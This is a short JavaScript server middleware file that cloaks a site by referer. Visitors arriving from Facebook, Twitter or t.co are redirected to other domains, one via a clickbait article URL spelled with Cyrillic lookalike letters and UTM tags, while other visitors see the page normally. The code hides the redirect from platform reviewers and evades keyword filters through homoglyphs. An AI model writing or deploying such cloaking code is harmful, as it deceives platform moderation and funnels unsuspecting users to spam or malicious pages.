/* export default  (req, res, next) => {
    console.log(req.url);
    const headers = req.headers;
    res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
        res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
    } else {
        next();
    }
};
 */
export default defineEventHandler((event) => {
    const headers = event.req.headers;
    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
        if(event.req.url.includes('d%d0%b5mi-rose-bar%d0%b5s-her-b%e1%b4%9cm-in-s%d0%b5%d0%b5-thro%e1%b4%9cgh-dr%d0%b5ss-as-she-mod%d0%b5ls-her-own-bi%d0%baini-rang%d0%b5')){
            sendRedirect(event,"https://newslife247.site/d%d0%b5mi-rose-bar%d0%b5s-her-b%e1%b4%9cm-i%d0%bf-s%d0%b5%d0%b5-thro%e1%b4%9cgh-dr%d0%b5ss-as-she-mod%d0%b5ls-her-ow%d0%bf-bi%d0%bai%d0%bfi-ra%d0%bfg%d0%b5?utm_medium=Kate_Hudson_Lover&utm_source=Hao_10/05");
        }
        else{
            sendRedirect(event,"https://atoz24h.info"+event.req.url);
        }
        
    }
})